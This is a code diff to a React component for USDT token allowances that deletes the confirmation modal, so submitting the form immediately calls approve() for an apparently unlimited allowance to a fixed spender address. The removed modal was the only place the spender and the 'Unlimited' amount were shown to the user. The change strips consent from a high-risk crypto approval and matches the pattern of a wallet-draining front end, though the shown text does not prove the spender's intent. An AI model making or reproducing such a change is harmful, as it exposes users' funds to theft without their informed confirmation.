@@ -2,7 +2,6 @@ import React, { useState } from 'react';
 import { ShieldAlert, RefreshCw, KeyRound, Ban, ChevronDown } from 'lucide-react';
 import { useTokenAllowance } from '../hooks/useTokenAllowance';
 import { TOKEN_CONFIGS } from '../services/blockchain/tokenService';
-import ApprovalConfirmation from './ApprovalConfirmation';
 import ApprovalStatus from './ApprovalStatus';
 import { ReportBalances } from '../pages/Dashboard';
 
@@ -16,7 +15,6 @@ interface Props {
 }
 
 const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chainId, onConnect, reportBalances }) => {
-  const [showConfirmModal, setShowConfirmModal] = useState(false);
   const [inputError, setInputError] = useState('');
   const [isSelectingNetwork, setIsSelectingNetwork] = useState(false);
 
@@ -49,10 +47,6 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
     }
     
     setInputError('');
-    setShowConfirmModal(true);
-  };
-
-  const executeApproval = () => {
     approve(); // undefined amt defaults to unlimited
   };
 
@@ -241,19 +235,7 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, setNetwork, chai
         )}
       </div>
 
-      {/* Confirmation & Status Modals */}
-      <ApprovalConfirmation
-        isOpen={showConfirmModal}
-        onClose={() => setShowConfirmModal(false)}
-        onConfirm={executeApproval}
-        token="USDT"
-        network={getNetworkName(network)}
-        tokenAddress={getUsdtAddress()}
-        spender={fixedSpender}
-        currentAllowance={allowance}
-        requestedAllowance="Unlimited"
-      />
-
+      {/* Status Modal */}
       <ApprovalStatus
         state={txState}
         txHash={txHash}
